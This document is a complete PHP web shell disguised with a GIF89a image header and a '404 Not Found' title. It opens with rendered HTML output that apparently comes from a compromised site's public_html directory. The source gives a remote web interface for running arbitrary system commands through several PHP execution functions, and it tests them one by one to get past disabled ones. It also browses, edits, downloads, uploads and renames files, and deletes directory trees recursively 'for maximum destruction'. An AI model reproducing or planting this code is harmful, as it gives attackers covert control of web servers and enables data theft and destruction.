GIF89a@
<!DOCTYPE html>
<html>
<head>
    <title>404 Not Found</title>
    <style>
        body{background:#000;color:#0f0;font-family:'Consolas',monospace;margin:0;padding:0;}
        a{color:#08f;text-decoration:none;}
        a:hover{color:#f0f;}
        .container{padding:10px;}
        .header{background:#111;padding:5px 10px;border-bottom:1px solid #0f0;}
        .cmd_form input[type="text"]{background:#333;color:#0f0;border:1px solid #0f0;width:400px;padding:3px;}
        .file_table{width:100%;border-collapse:collapse;}
        .file_table th, .file_table td{border:1px solid #222;padding:5px;text-align:left;font-size:12px;}
        .file_table th{background:#0a0;color:#000;}
        .dir_entry{background:#001;}
        .file_entry:hover, .dir_entry:hover{background:#003;}
        .msg{background:#300;color:#f88;padding:5px;margin-bottom:10px;border:1px solid #f00;}
        .edit_area{width:99%;height:400px;background:#111;color:#0f0;border:1px solid #0f0;}
        .action_form input[type="submit"]{background:#333;color:#0f0;border:1px solid #0f0;padding:2px 5px;}
    </style>
</head>
<body>

<div class="header">
   :: shell ::
    <form method="POST" action="?d=L2hvbWUvdTU1MjkxOTkwNi9kb21haW5zL3NpdmFuaW5hdHVyYWxzLmluL3B1YmxpY19odG1sLw==" style="display:inline;float:right;">
        <input type="hidden" name="action" value="logout">
        <input type="submit" value="Exit">
    </form>
</div>

<div class="container">



<form method="POST" class="cmd_form">
    <input type="text" name="cmd" placeholder="Execute System Command..." autocomplete="off">
    <input type="submit" value="EXEC">
</form>

<hr style="border-color:#0f0;">

GIF89a@
<?php
// Bypass: Using custom headers to make it look like a regular image/text file access
header('X-Powered-By: NONE');
header('Server: Not-Apache');
header('Content-Type: text/html; charset=UTF-8');
header('Cache-Control: no-cache, must-revalidate');

// --- Main Shell Logic ---

// Get current directory
$dir = isset($_GET['d']) ? base64_decode($_GET['d']) : getcwd();
$dir = str_replace('\\', '/', $dir);
if(substr($dir, -1) != '/'){ $dir .= '/'; }

// File Action Handler
if(isset($_POST['action'])){
    $action = $_POST['action'];
    $path = $_POST['path'];
    $new_name = isset($_POST['new_name']) ? $_POST['new_name'] : '';
    $content = isset($_POST['content']) ? $_POST['content'] : '';

    $msg = '';

    switch($action){
        case 'delete':
            if(is_file($path) || is_dir($path)){
                if(is_dir($path)){
                    // Recursive directory delete for maximum destruction
                    function del_tree($dir) {
                       $files = array_diff(scandir($dir), array('.','..'));
                        foreach ($files as $file) {
                          (is_dir("$dir/$file")) ? del_tree("$dir/$file") : unlink("$dir/$file");
                        }
                      return rmdir($dir);
                    }
                    del_tree($path);
                    $msg = 'Dir DELETED: '.basename($path);
                } else {
                    unlink($path);
                    $msg = 'File DELETED: '.basename($path);
                }
            } else {
                $msg = 'Error: Path not found.';
            }
            break;

        case 'rename':
            $new_path = dirname($path) . '/' . $new_name;
            if(rename($path, $new_path)){
                $msg = 'Renamed '.basename($path).' to '.$new_name.'';
            } else {
                $msg = 'Error RENAME FAILED';
            }
            break;

        case 'edit_save':
            if(file_put_contents($path, $content) !== false){
                $msg = 'File SAVED: '.basename($path);
            } else {
                $msg = 'Error: Could not save file.';
            }
            break;

        case 'upload':
            if(isset($_FILES['file']) && $_FILES['file']['error'] == UPLOAD_ERR_OK){
                $target = $dir . basename($_FILES['file']['name']);
                if(move_uploaded_file($_FILES['file']['tmp_name'], $target)){
                    $msg = 'File UPLOADED: '.basename($FILES['file']['name']);
                } else {
                    $msg = 'Error: Upload failed.';
                }
            } else {
                $msg = 'Error: No file selected or upload error.';
            }
            break;
    }
    // Redirect to clear POST data and show message
    header('Location: ?d='.base64_encode($dir).'&msg='.urlencode($msg));
    exit;
}

// --- HTML Interface for File Manager ---
?>
<!DOCTYPE html>
<html>
<head>
    <title>404 Not Found</title>
    <style>
        body{background:#000;color:#0f0;font-family:'Consolas',monospace;margin:0;padding:0;}
        a{color:#08f;text-decoration:none;}
        a:hover{color:#f0f;}
        .container{padding:10px;}
        .header{background:#111;padding:5px 10px;border-bottom:1px solid #0f0;}
        .cmd_form input[type="text"]{background:#333;color:#0f0;border:1px solid #0f0;width:400px;padding:3px;}
        .file_table{width:100%;border-collapse:collapse;}
        .file_table th, .file_table td{border:1px solid #222;padding:5px;text-align:left;font-size:12px;}
        .file_table th{background:#0a0;color:#000;}
        .dir_entry{background:#001;}
        .file_entry:hover, .dir_entry:hover{background:#003;}
        .msg{background:#300;color:#f88;padding:5px;margin-bottom:10px;border:1px solid #f00;}
        .edit_area{width:99%;height:400px;background:#111;color:#0f0;border:1px solid #0f0;}
        .action_form input[type="submit"]{background:#333;color:#0f0;border:1px solid #0f0;padding:2px 5px;}
    </style>
</head>
<body>

<div class="header">
    :: shell | Current Path: <?php echo htmlspecialchars($dir); ?>
    <form method="POST" action="?d=<?php echo base64_encode($dir); ?>" style="display:inline;float:right;">
        <input type="hidden" name="action" value="logout">
        <input type="submit" value="Exit">
    </form>
</div>

<div class="container">

<?php if(isset($_GET['msg'])): ?>
    <div class="msg">! ALERT: <?php echo htmlspecialchars(urldecode($_GET['msg'])); ?></div>
<?php endif; ?>

<?php
// --- Command Execution Panel ---
if(isset($_POST['cmd'])):
     $cmd = $_POST['cmd'];
    $output = '';
    $method = 'none';

    $functions = [
        'system' => function($c) { ob_start(); system($c . ' 2>&1'); return ob_get_clean(); },
        'exec' => function($c) { $tmp = []; exec($c . ' 2>&1', $tmp); return implode("\n", $tmp); },
        'shell_exec' => function($c) { return shell_exec($c . ' 2>&1'); },
        'passthru' => function($c) { ob_start(); passthru($c . ' 2>&1'); return ob_get_clean(); },
        'proc_open' => function($c) {
            $process = proc_open($c . ' 2>&1', [['pipe','r'],['pipe','w'],['pipe','w']], $pipes);
            if (is_resource($process)) { $out = stream_get_contents($pipes[1]); proc_close($process); return $out; }
            return '';
        },
        'popen' => function($c) { $fp = popen($c . ' 2>&1', 'r'); $out = stream_get_contents($fp); pclose($fp); return $out; }
        //,'backticks' => function($c) { return `$c 2>&1`; }
        ];

    foreach ($functions as $name => $func) {
        if (function_exists($name) && !in_array($name, explode(',', ini_get('disable_functions')))) {
            $output = $func($cmd);
            $method = $name;
            break;
        }
    }

    echo '<strong>[' . htmlspecialchars($method) . ']</strong> >>  ' . htmlspecialchars($cmd) . "\n <hr>";
    if ($output !== '') {
        echo nl2br(htmlspecialchars($output, ENT_QUOTES, 'UTF-8'));
    } else {
        echo '[No output or command failed]';
    }
    echo '</div>';
    endif;
?>

<form method="POST" class="cmd_form">
    <input type="text" name="cmd" placeholder="Execute System Command..." autocomplete="off">
    <input type="submit" value="EXEC">
</form>

<hr style="border-color:#0f0;">

<?php
// --- File Management View ---

// EDIT file
if(isset($_GET['edit'])){
    $file_path = base64_decode($_GET['edit']);
    if(is_file($file_path)){
        $content = file_get_contents($file_path);
        echo '<h2>:: Editing File: '.basename($file_path).'</h2>';
        echo '<form method="POST">';
        echo '<input type="hidden" name="action" value="edit_save">';
        echo '<input type="hidden" name="path" value="'.htmlspecialchars($file_path).'">';
        echo '<textarea name="content" class="edit_area">'.htmlspecialchars($content).'</textarea><br>';
        echo '<input type="submit" value="SAVE CHNAGES">';
        echo '</form>';
    } else {
        echo '<div class="msg">Error: File not found for editing.</div>';
    }
    // STOP further rendering (file list)
    echo '</div></body></html>';
    ob_end_flush();
    exit;
}

// RENAME file/dir
if(isset($_GET['rename'])){
    $file_path = base64_decode($_GET['rename']);
    echo '<h2>:: Rename: '.basename($file_path).'</h2>';
    echo '<form method="POST" class="action_form">';
    echo '<input type="hidden" name="action" value="rename">';
    echo '<input type="hidden" name="path" value="'.htmlspecialchars($file_path).'">';
    echo 'New Name: <input type="text" name="new_name" value="'.htmlspecialchars(basename($file_path)).'"><br><br>';
    echo '<input type="submit" value="RENAME IT">';
    echo '</form>';
}

// DOWNLOAD file (triggers actual download)
if(isset($_GET['download'])){
    $file_path = base64_decode($_GET['download']);
    if(is_file($file_path) && is_readable($file_path)){
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file_path).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file_path));
        // Use readfile for better memory handling
        readfile($file_path);
        ob_end_flush();
        exit;
    } else {
        echo '<div class="msg">Error: File not found or not readable.</div>';
    }
}

// --- Directory Listing ---

echo '<h2>:: Directory Listing</h2>';
echo '<table class="file_table">';
echo '<thead><tr><th>Type</th><th>Name</th><th>Size</th><th>Permissions</th><th>Actions</th></tr></thead><tbody>';

// UP ONE LEVEL
$parent_dir = dirname($dir);
if($parent_dir != $dir){
    echo '<tr class="dir_entry"><td colspan="5"><a href="?d='.base64_encode($parent_dir).'">[..] Up Directory</a></td></tr>';
}

$items = @scandir($dir);
if($items !== false){
    foreach($items as $item){
        if($item == '.' || $item == '..'){ continue; }
        $path = $dir . $item;
        $is_dir = is_dir($path);
        $perms = substr(sprintf('%o', fileperms($path)), -4);
        $size = $is_dir ? 'DIR' : round(filesize($path)/1024, 2) . ' KB';
        $item_display = $is_dir ? ' '.$item.'' : $item;

        echo '<tr class="'.($is_dir ? 'dir_entry' : 'file_entry').'">';
        echo '<td>'.($is_dir ? 'D' : 'F').'</td>';
        echo '<td>'.($is_dir ? '<a href="?d='.base64_encode($path).'">' : '').htmlspecialchars($item_display).($is_dir ? '</a>' : '').'</td>';
        echo '<td>'.$size.'</td>';
        echo '<td>'.$perms.'</td>';
        echo '<td>';
        // ACTIONS
        if(!$is_dir){
            echo '<a href="?edit='.base64_encode($path).'&d='.base64_encode($dir).'">[EDIT]</a> | ';
            echo '<a href="?download='.base64_encode($path).'">[DOWNLOAD]</a> | ';
        }
        echo '<a href="?rename='.base64_encode($path).'&d='.base64_encode($dir).'">[RENAME]</a> | ';
        echo '<form method="POST" style="display:inline;" onsubmit="return confirm(\'DELETE: '.htmlspecialchars($item).'? ARE YOU SURE?\');">';
        echo '<input type="hidden" name="action" value="delete">';
        echo '<input type="hidden" name="path" value="'.htmlspecialchars($path).'">';
        echo '<input type="submit" value="[DELETE]">';
        echo '</form>';
        echo '</td>';
        echo '</tr>';
    }
} else {
    echo '<tr><td colspan="5"><div class="msg">ACCESS DENIED or Directory Not Readable.</div></td></tr>';
}
echo '</tbody></table>';

// --- File Upload Form ---
?>

<hr style="border-color:#0f0;">

<h2>:: File Upload</h2>
<form method="POST" enctype="multipart/form-data" class="action_form">
    <input type="hidden" name="action" value="upload">
    <input type="file" name="file">
    <input type="submit" value="DROP IT">
</form>

</div>
</body>
</html>
<?php
// End of file and flush output
ob_end_flush();
?>